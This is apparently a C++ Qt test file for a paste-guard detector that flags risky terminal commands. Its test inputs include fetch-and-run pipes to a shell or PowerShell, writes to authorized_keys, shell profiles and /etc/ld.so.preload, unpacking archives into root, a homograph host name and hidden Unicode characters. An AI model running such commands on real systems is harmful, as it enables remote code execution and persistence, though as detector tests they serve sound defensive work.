#include "pasteguard.h"
#include <QDebug>

static int failures = 0;
#define CHECK(expression)                                                                                                        \
    if (!(expression))                                                                                                           \
    {                                                                                                                            \
        qCritical() << __LINE__ << #expression;                                                                                  \
        ++failures;                                                                                                              \
    }

static bool has(const QString &text, PasteRisk::Kind kind, int line = 0)
{
    for (const auto &r : pasteRisks(text))
        if (r.kind == kind && (!line || r.line == line))
            return true;
    return false;
}

int main()
{
    // Ordinary commands: nothing to report.
    for (const auto *safe : {"ls -la /tmp", "curl -O https://example.com/a.tar.gz", "tar xzf a.tar.gz -C /opt",
                             "echo hi > out.txt", "cat ~/.bashrc", "grep sh file | sort", "unzip a.zip -d /tmp/x",
                             "ssh admin@paypal.com", "echo привет мир", "cd / && ls"})
        CHECK(pasteRisks(QString::fromUtf8(safe)).isEmpty())
    CHECK(has("curl -fsSL https://get.example.sh | sh", PasteRisk::PipeToShell))
    CHECK(has("curl -s https://x | sudo -E bash -", PasteRisk::PipeToShell))
    CHECK(has("wget -qO- https://x | /bin/bash", PasteRisk::PipeToShell))
    CHECK(has("curl https://x | python3", PasteRisk::PipeToShell))
    CHECK(has("bash <(curl -s https://x)", PasteRisk::PipeToShell))
    CHECK(has("sh -c \"$(curl -fsSL https://x)\"", PasteRisk::PipeToShell))
    CHECK(has("iwr https://x/i.ps1 | iex", PasteRisk::PipeToShell))
    CHECK(has("iex (New-Object Net.WebClient).DownloadString('https://x')", PasteRisk::PipeToShell))
    CHECK(has("echo 'alias ls=rm' >> ~/.bashrc", PasteRisk::Profile))
    CHECK(has("echo key | tee -a /root/.ssh/authorized_keys", PasteRisk::Profile))
    CHECK(has("echo x > /etc/ld.so.preload", PasteRisk::Profile))
    CHECK(has("echo 'export A=1' >> $HOME/.zshrc", PasteRisk::Profile))
    CHECK(has("sudo tar xzf payload.tgz -C /", PasteRisk::UnpackRoot))
    CHECK(has("tar --directory=/ -xf p.tar", PasteRisk::UnpackRoot))
    CHECK(has("unzip -o p.zip -d /", PasteRisk::UnpackRoot))
    CHECK(has("cd / && sudo tar xf /tmp/p.tar", PasteRisk::UnpackRoot))
    // Cyrillic "р" and "а" inside a Latin host name, on the second line.
    CHECK(has(QString::fromUtf8("ls\nssh admin@раypal.com"), PasteRisk::Homograph, 2))
    CHECK(has(QString::fromUtf8("ls -la"), PasteRisk::Invisible, 1))
    CHECK(has(QString::fromUtf8("rm -rf /tmp/x​"), PasteRisk::Invisible))
    CHECK(has(QString::fromUtf8("echo ‮gnp.exe"), PasteRisk::Invisible))
    CHECK(pasteCleaned(QString::fromUtf8("ls -la​ /tmp")) == "ls -la /tmp")
    CHECK(pasteLineCount("ls") == 1)
    CHECK(pasteLineCount("ls\n") == 2)
    CHECK(pasteLineCount("a\r\nb\rc") == 3)
    if (failures)
        qCritical() << failures << "failures";
    return failures ? 1 : 0;
}
